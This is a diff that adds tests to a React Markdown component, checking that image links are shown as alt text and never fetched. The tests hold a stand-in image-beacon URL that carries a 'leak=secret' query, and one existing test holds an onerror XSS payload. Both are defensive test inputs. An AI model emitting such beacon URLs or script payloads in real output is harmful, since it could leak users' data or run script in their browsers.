@@ -61,6 +61,24 @@ describe("Markdown", () => {
     expect(screen.getByText(/file/)).toBeInTheDocument();
   });
 
+  it("names an image instead of fetching it", () => {
+    // `![](https://…)` would otherwise reach that host the moment the text
+    // rendered, with nobody having clicked anything, and the URL carries
+    // whatever its author put in it. Neither parser this replaced could render
+    // an image at all.
+    render(<Markdown body="![a diagram](https://tracker.example/p.gif?leak=secret)" />);
+
+    expect(document.querySelector("img")).toBeNull();
+    expect(screen.getByText("a diagram")).toBeInTheDocument();
+  });
+
+  it("names an image that has no alt text", () => {
+    render(<Markdown body="![](https://tracker.example/p.gif)" />);
+
+    expect(document.querySelector("img")).toBeNull();
+    expect(screen.getByText("Image")).toBeInTheDocument();
+  });
+
   it("does not render raw HTML, whatever the source claims", () => {
     render(<Markdown body={'Before <img src="x" onerror="alert(1)"> after'} />);
 
